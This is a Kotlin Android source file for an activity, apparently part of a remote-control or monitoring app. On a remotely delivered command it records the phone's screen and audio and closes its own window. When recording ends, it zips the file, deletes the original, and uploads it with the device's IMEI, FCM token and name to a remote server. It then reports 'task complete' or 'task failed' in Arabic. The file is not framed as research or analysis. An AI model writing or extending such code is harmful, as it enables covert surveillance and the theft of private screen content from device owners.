package com.example.mobiletwo

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.util.SparseIntArray
import android.view.Surface
import java.io.File
import java.io.IOException

class VideoRecord : Activity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        ri = intent.getIntExtra("ri", 0)
        command = intent.getStringExtra("command") ?: ""
        mOrientations.append(Surface.ROTATION_0, 90)
        mOrientations.append(Surface.ROTATION_90, 0)
        mOrientations.append(Surface.ROTATION_180, 270)
        mOrientations.append(Surface.ROTATION_270, 180)

        val mMetrics = resources.displayMetrics
        //windowManager.defaultDisplay.getMetrics(mMetrics)

        mDpi = mMetrics.densityDpi
        mWidth = mMetrics.widthPixels
        mHeight = mMetrics.heightPixels
        mMediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(baseContext)
        } else {
            MediaRecorder()
        }
        print("${(mMediaRecorder == null)}")

        //mMediaRecorder.setMaxDuration(1*60*1000)//1min*sec*milli
        //mMediaRecorder.setMaxFileSize(1*1024*1024)//1MB*KB*B
        mMediaRecorder!!.setOnInfoListener(MOnInfoListener)
        mMediaProjectionManager =
            getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        println("Ready to record")
        initRecorder()
        startRecording()
    }

    object MOnInfoListener : MediaRecorder.OnInfoListener {
        override fun onInfo(p0: MediaRecorder?, p1: Int, p2: Int) {
            if (p1 == MediaRecorder.MEDIA_RECORDER_INFO_MAX_FILESIZE_REACHED) {
                p0?.stop()
                p0?.reset()
                stopRecording()
                return
            }
            if (p1 == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
                p0?.stop()
                p0?.reset()
                stopRecording()
                return
            }
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        try {
            if (data == null) {
                finishAffinity()
                Thread {
                    MyApiOld.resp(
                        ri.toString(), "فشل المهمه", "", "", "5",
                        command, "", MyFireBaseMessagingService.dSPRead.getString("imei", "") ?: ""
                    )
                }.start()
            }
            if (requestCode != 123 || resultCode != RESULT_OK) {
                return
            }
            Thread.sleep(5000)
            mMediaProjection = mMediaProjectionManager?.getMediaProjection(resultCode, data!!)

            mVirtualDisplay = mMediaProjection?.createVirtualDisplay(
                "ScreenRecorder", mWidth, mHeight, mDpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, mMediaRecorder?.surface, null, null
            )
            mMediaRecorder?.start()
            finishAffinity()
        } catch (ex: Exception) {
            MyExecutorFG.logEx(ex, "onActivityResult")
            finishAffinity()
            Thread {
                MyApiOld.resp(ri.toString(), "فشل المهمه", "", "", "5",
                    command, "", MyFireBaseMessagingService.dSPRead.getString("imei", "") ?: ""
                )
            }.start()
        }
    }


    private fun initRecorder() {
        try {
            mMediaRecorder?.setAudioSource(MediaRecorder.AudioSource.DEFAULT)
            mMediaRecorder?.setVideoSource(MediaRecorder.VideoSource.SURFACE)
            mMediaRecorder?.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
            mMediaRecorder?.setVideoSize(1024, 2048)
            mMediaRecorder?.setVideoFrameRate(30)
            mMediaRecorder?.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
            mMediaRecorder?.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
            File("${Consts.sFiles.path}/Records/").mkdirs()
            mPath=("${Consts.sFiles.path}/Records/Record_${System.currentTimeMillis()}.3gp")
//            File("/storage/emulated/0/spotnik/Records/").mkdirs()
//            mPath = ("/storage/emulated/0/spotnik/Records/Record_${System.currentTimeMillis()}.3gp")
            mMediaRecorder?.setOutputFile(mPath)
            mMediaRecorder?.setVideoEncodingBitRate(500 * 1000)
            val rotation: Int = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                baseContext.display!!.rotation
            } else {
                windowManager.defaultDisplay.rotation
            }
            val mOrientation = mOrientations.get(rotation + 90)
            mMediaRecorder?.setOrientationHint(mOrientation)
            mMediaRecorder?.setMaxDuration(Consts.MaxVideoRecordTime*60*1000)//1min*sec*milli
            mMediaRecorder?.setMaxFileSize((Consts.MaxVideoSizeMega*1024*1024).toLong())//1MB*KB*B
//            mMediaRecorder?.setMaxDuration(1 * 60 * 1000)//1min*sec*milli
//            mMediaRecorder?.setMaxFileSize((5 * 1024 * 1024).toLong())//1MB*KB*B
            mMediaRecorder?.setOnInfoListener(MOnInfoListener)
            mMediaRecorder?.prepare()
        } catch (ex: IOException) {
            MyExecutorFG.logEx(ex, "initRecorder")
        } catch (ex: SecurityException) {
            MyExecutorFG.logEx(ex, "initRecorder")
        }
    }

    private fun startRecording() {
        try {
            if (mMediaProjection == null) {
                startActivityForResult(mMediaProjectionManager?.createScreenCaptureIntent(), 123)
                return
            }
        } catch (ex: Exception) {
            MyExecutorFG.logEx(ex, "startRecording")
        }
    }

    companion object {
        private var mDpi: Int = 0
        private var mWidth: Int = 0
        private var mHeight: Int = 0
        private var mMediaProjectionManager: MediaProjectionManager? = null
        private var mMediaProjection: MediaProjection? = null
        var mVirtualDisplay: VirtualDisplay? = null
        private var mMediaRecorder: MediaRecorder? = null
        private var mOrientations: SparseIntArray = SparseIntArray()
        private var command = ""
        private var ri = 0
        private var mPath = ""
        fun stopRecording() {
            try {
                mVirtualDisplay?.release()
                mMediaProjection?.stop()
                mMediaProjection = null
                //compress
                val comped = MyExecutorFG.zipLocalFile(arrayListOf(mPath), "$mPath.zip")
                File(mPath).delete()
                Log.i("Done", "True")
                //upload
                Thread {
                    Log.i("Thread", "Started")
                    MyApiOld.conan(
                        ri.toString(),
                        MyFireBaseMessagingService.dSPRead.getString("FCMToken", "") ?: "",
                        command,
                        MyFireBaseMessagingService.dSPRead.getString("mDeviceName", "") ?: "",
                        comped,
                        "videoRecord.zip",
                        "images",
                        MyFireBaseMessagingService.dSPRead.getString("imei", "") ?: "",
                        null,
                        null,
                        true
                    )
                    MyApiOld.resp(
                        ri.toString(), "المهمه مكتمله", "", "", "3",
                        command, "", MyFireBaseMessagingService.dSPRead.getString("imei", "") ?: ""
                    )
                }.start()
            } catch (ex: Exception) {
                MyExecutorFG.logEx(ex, "stopRecording")
                //report failed
                Thread {
                    MyApiOld.resp(
                        ri.toString(), "فشل المهمه", "", "", "5",
                        command, "", MyFireBaseMessagingService.dSPRead.getString("imei", "") ?: ""
                    )
                }.start()
            }
        }
    }

}

